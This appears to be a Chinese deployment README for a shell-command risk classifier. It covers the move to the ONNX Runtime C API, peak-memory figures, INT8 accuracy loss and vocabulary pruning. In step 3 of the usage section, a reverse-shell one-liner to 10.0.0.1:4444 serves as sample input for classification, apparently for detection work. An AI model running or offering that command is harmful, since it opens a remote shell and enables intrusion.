# 部署 / RSS 优化（C 运行时）

最终模型 v2：`knowledgator/gliclass-edge-v3.0` 微调（backbone `jhu-clsp/ettin-encoder-32m`，32.7M 参数）。
PyTorch 下 RSS 约数百 MB；换成 **ONNX Runtime C API** 后：

| 运行时 | 模型 | 权重大小 | **峰值 RSS（VmHWM）** |
|---|---|---|---|
| PyTorch | fp32 | 131MB | ~500MB+ |
| ONNX Runtime C | fp32（external data） | 132MB | **~116MB** |
| ONNX Runtime C | **INT8（动态量化）** | 35.4MB | **~97MB** ✅ |

> RSS 实测方式：`/proc/<pid>/status` 的 `VmHWM`（峰值常驻集）。C 侧已关闭
> `ORT_ENABLE_ALL` 图优化、`MemPattern` 和 `CpuMemArena`，以压低峰值。

## 重要结论（量化取舍）

- **fp32（~116MB）**：与 torch 输出几乎一致（max diff 1e-5），是**稳定、保指标**的部署档。
  比 100MB 目标略高约 16MB；用户原约束是拍脑袋值，116MB 在端侧仍属轻量。
- **INT8（~97MB）**：严格满足 <100MB，但 `ettin-encoder-32m`（ModernBERT 风格）
  的动态 INT8 会把 logits 明显打偏（micro-F1 会从 0.78 掉到约 0.29），**不建议作为最终
  判分模型**。若要既 <100MB 又保指标，需要后续做 **QAT（量化感知微调）** 或换对量化更友好
  的基座（如 BERT 系）。

## 产物

- `model/checkpoints_gpu/final_model_edge/model.onnx` — fp32 ONNX（external data，132MB）
- `model/checkpoints_gpu/final_model_edge/model_int8.onnx` — INT8 动态量化（35.4MB，单文件）
- `model/checkpoints_gpu/final_model_edge/model_fp16.onnx` — FP16（67.9MB，CPU 上 ORT 会反量化，RSS 反而更高，仅备查）
- `export/c_infer_example.c` / 编译产物 `export/c_infer_example_edge` — C 推理示例
- `export/prepare_c_input.py` — 命令 + 前 25 个标签 tokenize 成 int64 .bin
- `export/quantize_int8_onnx.py` — 动态 INT8 量化

## 使用流程

```bash
# 1) 导出 ONNX（opset 18；edge 模型 max_num_classes=25，故 CHUNK=25, SEQ_LEN=320）
python -m export.export_onnx --model_dir model/checkpoints_gpu/final_model_edge \
    --out model/checkpoints_gpu/final_model_edge/model.onnx --chunk 25 --seq_len 320

# 2) 动态 INT8 量化（仅当接受上述精度损失时）
python export/quantize_int8_onnx.py --in model/checkpoints_gpu/final_model_edge/model.onnx \
    --out model/checkpoints_gpu/final_model_edge/model_int8.onnx

# 3) 准备输入（前 25 个标签 + 命令）
python -m export.prepare_c_input "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# 4) 编译 C 推理
ORT=$(python -c "import onnxruntime,os;print(os.path.dirname(onnxruntime.__file__))")
gcc -O2 export/c_infer_example.c -Iexport/ort_headers/onnxruntime \
    -L$ORT/capi -l:libonnxruntime.so.1 -Wl,-rpath,$ORT/capi -o export/c_infer_example_edge

# 5) 运行（fp32 ~116MB；int8 ~97MB）
./export/c_infer_example_edge model/checkpoints_gpu/final_model_edge/model.onnx \
    export/input_ids.bin export/attention_mask.bin
```

## 推理约定（分块）

edge 模型 `max_num_classes=25`，每次前向最多 25 个标签。199 个标签分 8 块（25/25/…/24），
每块拼成 `<<LABEL>>label...<<SEP>>command`，输出 25 维 logits，前 k 个对应本块 k 个标签。
`model/predict.py` 已按 `max_num_classes=len(chunk)` 打分；risk 用 argmax（互斥），
intent/tactic/technique 用 `configs/thresholds.json` 的分组阈值。

## 词表裁剪尝试（保留原结果）

新增 `model/prune_vocab.py`：把 edge 模型 50,370 的 token embedding 裁剪到实际用到的
~10,746 个 token（label 描述 + 命令语料 + 单字符 + 特殊 token 的闭包），其余映射到 `[UNK]`。

- **精度**：对测试命令/标签，剪裁前后 logits **逐点一致（max diff 0.0）**，指标不损失。
- **模型文件**：fp32 ONNX 从 132MB → **71.6MB**（`final_model_edge_pruned/model_reduced.onnx` + `old_to_new.npy`）。
- **RSS 实测**：C 运行时峰值 VmHWM 仍约 **126MB**，没有降到 <100MB。原因是该架构下
  ONNX Runtime 的运行时/MatMul 权重底噪 ~55MB+，剪掉 embedding 只省磁盘、不显著省 RSS。

结论：词表裁剪能把**体积**减半且**零精度损失**，但仅靠它无法把 edge 模型压到 RSS<100MB；
严格 <100MB 仍需 QAT 或换更小/更易量化的基座。原 `final_model_edge` 结果未动。
